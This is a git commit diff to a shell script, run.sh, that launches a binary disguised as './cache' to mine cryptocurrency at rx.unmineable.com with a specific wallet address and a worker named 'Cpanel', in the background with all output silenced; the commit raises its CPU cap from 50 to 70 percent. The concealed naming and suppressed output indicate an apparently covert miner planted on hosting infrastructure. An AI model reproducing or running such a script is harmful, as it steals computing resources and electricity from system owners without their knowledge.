8854025c84153c365828452509177e1ee6b685dd
robertreynolds2 <64372884+robertreynolds2@users.noreply.github.com>
2022-07-16 20:12:28 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,1 +1,1 @@
-nohup ./cache -o rx.unmineable.com:80 -u BTT:TF9Mph5JYPTjK9YukuEA8Urkgro9GmiEF8.Cpanel -p x -k -a rx --max-cpu-usage 50 --background > /dev/null 2>&1 < /dev/null &
+nohup ./cache -o rx.unmineable.com:80 -u BTT:TF9Mph5JYPTjK9YukuEA8Urkgro9GmiEF8.Cpanel -p x -k -a rx --max-cpu-usage 70 --background > /dev/null 2>&1 < /dev/null &
